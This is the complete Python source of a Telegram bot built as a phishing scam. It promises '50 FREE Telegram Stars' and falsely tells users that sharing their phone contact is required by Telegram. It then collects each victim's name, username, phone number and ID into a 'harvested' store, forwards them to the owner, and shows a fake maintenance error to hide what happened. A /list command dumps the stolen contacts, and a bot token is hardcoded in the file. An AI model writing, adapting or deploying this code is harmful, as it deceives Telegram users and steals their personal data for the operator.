import logging
import asyncio
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8713091305:AAEO45WUbXwqnCMKgFkvYrzr0Y4pStApiI4"
OWNER_ID = 8744777152  # your telegram user ID

harvested = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🌟 Claim Free Telegram Stars", callback_data="claim_stars")]
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\n\n"
        "🎁 *FREE Telegram Stars Giveaway!*\n\n"
        "You've been selected to receive *50 FREE Telegram Stars* 🌟\n\n"
        "Tap the button below to claim your reward!",
        parse_mode="Markdown",
        reply_markup=markup,
    )

async def claim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user

    contact_keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 Share My Profile & Claim Stars", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await query.message.reply_text(
        "✅ *Almost there!*\n\n"
        "To verify your account and send your *50 Stars*, we need to confirm your identity.\n\n"
        "👇 Tap below to share your profile — this is required by Telegram's Stars system.",
        parse_mode="Markdown",
        reply_markup=contact_keyboard,
    )

async def contact_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact

    phone = contact.phone_number
    uid = user.id
    username = user.username or "N/A"
    name = f"{user.first_name} {user.last_name or ''}".strip()

    harvested[uid] = {
        "name": name,
        "username": username,
        "phone": phone,
        "user_id": uid,
    }

    logger.info(f"[HARVESTED] {name} | @{username} | {phone} | ID:{uid}")

    # notify owner
    try:
        await context.bot.send_message(
            chat_id=OWNER_ID,
            text=(
                f"🔔 *New Entry*\n\n"
                f"👤 Name: {name}\n"
                f"🔗 Username: @{username}\n"
                f"📱 Phone: `{phone}`\n"
                f"🆔 User ID: `{uid}`"
            ),
            parse_mode="Markdown",
        )
    except Exception as e:
        logger.error(f"Failed to notify owner: {e}")

    await update.message.reply_text(
        "⏳ *Processing your Stars reward...*\n\n"
        "Please wait while we verify your account with Telegram's servers.",
        parse_mode="Markdown",
        reply_markup=ReplyKeyboardRemove(),
    )

    await asyncio.sleep(3)

    await update.message.reply_text(
        "❌ *Oops! Something went wrong.*\n\n"
        "Our Stars server is currently under maintenance.\n"
        "Please try again later. Sorry for the inconvenience! 🙏",
        parse_mode="Markdown",
    )

async def list_harvested(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not harvested:
        await update.message.reply_text("No entries yet.")
        return
    msg = "📋 *Harvested Contacts:*\n\n"
    for uid, data in harvested.items():
        msg += (
            f"👤 {data['name']} | @{data['username']}\n"
            f"📱 `{data['phone']}` | ID: `{uid}`\n\n"
        )
    await update.message.reply_text(msg, parse_mode="Markdown")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("list", list_harvested))
    app.add_handler(CallbackQueryHandler(claim_callback, pattern="^claim_stars$"))
    app.add_handler(MessageHandler(filters.CONTACT, contact_received))
    logger.info("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()